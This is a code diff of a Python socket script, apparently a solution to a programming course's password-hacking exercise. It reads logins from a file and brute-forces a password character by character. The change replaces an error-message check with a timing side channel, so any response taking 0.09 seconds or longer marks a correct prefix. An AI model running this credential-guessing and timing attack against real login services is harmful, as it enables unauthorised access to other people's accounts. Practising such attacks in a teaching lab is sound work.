@@ -4,6 +4,7 @@ import socket
 import itertools
 import string
 import json
+import time
 
 args = sys.argv
 if len(args) != 3:
@@ -54,7 +55,7 @@ def find_password(socket_cl, mode='log_pass'):
             message_1 = json.loads(json_recieved)['result']
             return message_1
 
-        with open('hacking/logins.txt') as file:
+        with open('logins.txt') as file:
             lst_login = file.readlines()
             lst_login = [password.rstrip() for password in lst_login]
             password = ' '
@@ -70,8 +71,10 @@ def find_password(socket_cl, mode='log_pass'):
             try:
                 for symbol in alpha_num_list:
                     pass_str = password + symbol
+                    start = time.time()
                     message_received = send_request(correct_login, pass_str)
-                    if message_received == "Exception happened during login":
+                    end = time.time()
+                    if (end - start) >= 0.090:
                         password = pass_str
                         break
                     elif message_received == "Connection success!":
